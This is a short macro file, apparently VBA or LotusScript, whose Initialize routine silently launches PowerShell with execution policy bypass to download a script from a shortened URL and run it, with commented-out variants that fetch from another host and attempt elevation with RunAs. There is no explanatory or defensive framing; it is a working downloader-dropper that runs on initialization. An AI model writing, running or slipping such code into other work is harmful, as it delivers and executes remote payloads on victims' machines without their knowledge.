Sub Test()
   msgbox "Test"
End Sub
  
Sub Initialize()
	Dim x
' RetVal = Shell("powershell -command Invoke-WebRequest -Uri 'http://iitd.info/fundone' -OutFile check.ps1 ; ./check.ps1", 1)
'RetVal = Shell("dir", 1)
x = Shell("POWERSHELL.exe -executionpolicy bypass -command " & """ cd $home; Invoke-WebRequest -Uri 'http://bit.ly/fundone123' -OutFile check.ps1; ./check.ps1""", vbHide)

'fSfv = "powershell -command Start-Process -Verb RunAs cd c:/; ./check.ps1"

End Sub